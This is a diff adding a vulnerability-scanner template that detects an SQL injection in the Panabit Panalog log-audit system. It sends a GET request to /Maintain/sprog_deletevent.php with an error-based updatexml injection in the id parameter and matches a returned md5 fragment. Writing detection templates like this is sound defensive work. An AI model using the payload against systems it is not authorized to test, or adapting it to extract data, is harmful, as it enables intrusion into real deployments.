@@ -1,0 +1,24 @@
+id: CVD-2023-1718
+
+info:
+  name: Panabit Panalog sprog_deletevent.php SQL 注入漏洞
+  author: SleepingBag945
+  severity: high
+  description: |
+    Panalog大数据日志审计系统定位于将大数据产品应用于高校、 公安、 政企、 医疗、 金融、 能源等行业之中，针对网络流量的信息进行日志留存，可对用户上网行为进行审计，逐渐形成大数据采集、 大数据分析、 大数据整合的工作模式，为各种网络用户提供服务。
+
+http:
+  - raw:
+    - |
+      GET /Maintain/sprog_deletevent.php?openid=1&id=1%20or%20updatexml(1,concat(0x7e,(md5(5))),0)&cloudip=1 HTTP/1.1
+      Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - 'e4da3b7fbbce2345d7772b0674a318d'
